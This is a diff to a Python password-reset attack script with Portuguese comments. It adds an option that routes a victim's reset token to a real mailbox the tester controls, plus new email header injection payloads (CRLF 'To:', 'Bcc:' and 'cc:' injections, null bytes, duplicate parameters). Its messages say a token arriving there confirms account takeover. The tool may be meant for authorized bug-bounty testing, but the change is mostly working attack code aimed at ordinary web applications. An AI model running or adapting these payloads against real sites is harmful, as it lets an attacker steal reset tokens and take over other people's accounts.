@@ -180,28 +180,38 @@ def test_host_header(url, data, oob=None):
             f"Enviado com Host: {attacker}. Verifique link no email.", "HIGH")
 
 
-def test_parameter_pollution(url, data, oob=None):
-    section("Parameter Pollution & Email Manipulation")
+def test_parameter_pollution(url, data, oob=None, attacker_email=None):
+    section("Parameter Pollution & Email Injection")
     email_key = next((k for k in data if "email" in k.lower()), None)
     if not email_key:
         log_warn("Campo 'email' não encontrado. Pulando."); return
 
     victim = data[email_key]
 
-    # Com OOB: attacker email usa o domínio interactsh — qualquer entrega é capturada
-    attacker = f"attacker@{oob}" if oob else f"attacker_{random.randint(1000,9999)}@attacker-oob.com"
-
-    if oob:
+    # Prioridade: --attacker-email > --oob > genérico
+    if attacker_email:
+        attacker = attacker_email
+        log_info(f"Attacker email real: {C}{attacker}{W}")
+        log_warn("Monitore a caixa de entrada desse email — token recebido = Account Takeover CONFIRMADO!")
+    elif oob:
+        attacker = f"attacker@{oob}"
         log_info(f"OOB ativo — attacker email: {C}{attacker}{W}")
-        log_warn("Qualquer entrega de email para esse endereço aparece no interactsh!")
+        log_warn("Qualquer entrega aparece no interactsh!")
     else:
-        log_warn(f"Sem OOB — attacker email: {attacker} (verificação manual necessária)")
+        attacker = f"attacker_{random.randint(1000,9999)}@attacker-oob.com"
+        log_warn(f"Sem attacker email — use --attacker-email para verificação real")
+
+    log_info(f"Victim:   {victim}")
+    log_info(f"Attacker: {attacker}")
+    print()
 
     tests = [
         ("Duplicate param",      f"{email_key}={victim}&{email_key}={attacker}"),
         ("Carbon Copy CRLF",     {email_key: f"{victim}%0Acc:{attacker}"}),
         ("Carbon Copy newline",  {email_key: f"{victim}\ncc:{attacker}"}),
         ("Carbon Copy tab",      {email_key: f"{victim}\tcc:{attacker}"}),
+        ("To injection CRLF",    {email_key: f"{victim}%0ATo:{attacker}"}),
+        ("Bcc injection",        {email_key: f"{victim}%0ABcc:{attacker}"}),
         ("Null byte",            {email_key: f"{victim}%00{attacker}"}),
         ("Null byte @",          {email_key: f"{victim}%00@{attacker}"}),
         ("Case variation",       {email_key: victim.upper()}),
@@ -213,6 +223,7 @@ def test_parameter_pollution(url, data, oob=None):
         ("Semicolon separated",  {email_key: f"{victim};{attacker}"}),
         ("Pipe separated",       {email_key: f"{victim}|{attacker}"}),
         ("Unicode @",            {email_key: victim.replace("@", "\uff20")}),
+        ("Both emails direct",   {email_key: attacker}),  # envia direto para attacker
     ]
 
     for name, payload in tests:
@@ -231,10 +242,16 @@ def test_parameter_pollution(url, data, oob=None):
                 print(f"  {icon}[{name}]{W} {r.status_code} | {len(r.text)}b {'← ACEITO!' if success else ''}")
         except Exception as e:
             print(f"  {R}[{name}]{W} Erro: {e}")
-        time.sleep(0.2)
+        time.sleep(0.3)
 
-    oob_note = f"Monitore interactsh para callbacks em {attacker}" if oob else f"Verifique emails em {attacker}"
-    log_warn(oob_note)
+    print()
+    if attacker_email:
+        log_warn(f"Verifique AGORA a caixa de {attacker_email}")
+        log_warn("Token recebido nesse email = Email Injection + Account Takeover — CRITICAL!")
+    elif oob:
+        log_warn(f"Monitore interactsh para callbacks em {attacker}")
+    else:
+        log_warn(f"Use --attacker-email SEU@EMAIL.COM para verificação real")
 
 
 def test_ssrf(url, data, oob=None):
@@ -361,12 +378,21 @@ def test_security_headers(url, data):
 def test_token_analysis(url, data, token_url=None):
     section("Token Analysis — Entropy, Reuse, IDOR, Pattern")
 
-    log_info("Cole tokens coletados para análise (Enter em branco para finalizar):")
+    log_info("Cole tokens — formatos aceitos:")
+    log_info("  Linha por linha  → cole um por vez + Enter")
+    log_info("  Vírgula          → token1,token2,token3")
+    log_info("  Espaço           → token1 token2 token3")
+    log_info("Enter em branco para finalizar.")
     tokens = []
     while True:
-        t = input("  Token: ").strip()
+        t = input("  Token(s): ").strip()
         if not t: break
-        tokens.append(t)
+        parts = re.split(r'[,;\s]+', t)
+        for p in parts:
+            p = p.strip()
+            if p: tokens.append(p)
+    seen = set()
+    tokens = [x for x in tokens if not (x in seen or seen.add(x))]
 
     if not tokens:
         log_warn("Nenhum token fornecido."); return
@@ -512,7 +538,8 @@ def main():
     parser.add_argument("--url",         required=True)
     parser.add_argument("--data",        required=True, help="'email=a@b.com' ou 'email=a@b.com&user=x'")
     parser.add_argument("--token-url",   help="URL completa de reset com token real")
-    parser.add_argument("--oob",         help="Domínio interactsh (ex: abc123.oast.live)")
+    parser.add_argument("--oob",            help="Domínio interactsh (ex: abc123.oast.live)")
+    parser.add_argument("--attacker-email", help="Email real que você controla para verificar entrega do token")
     parser.add_argument("--tests",       default="all",
         help="all, rate, host, pollution, ssrf, verb, headers, token, expiry, concurrent")
     parser.add_argument("--rate-rounds", type=int, default=20)
@@ -532,7 +559,7 @@ def main():
 
     if run_all or "rate"       in selected: test_rate_limit(args.url, data, args.rate_rounds)
     if run_all or "host"       in selected: test_host_header(args.url, data, args.oob)
-    if run_all or "pollution"  in selected: test_parameter_pollution(args.url, data, args.oob)
+    if run_all or "pollution"  in selected: test_parameter_pollution(args.url, data, args.oob, getattr(args, "attacker_email", None))
     if run_all or "ssrf"       in selected: test_ssrf(args.url, data, args.oob)
     if run_all or "verb"       in selected: test_verb_tampering(args.url, data)
     if run_all or "headers"    in selected: test_security_headers(args.url, data)
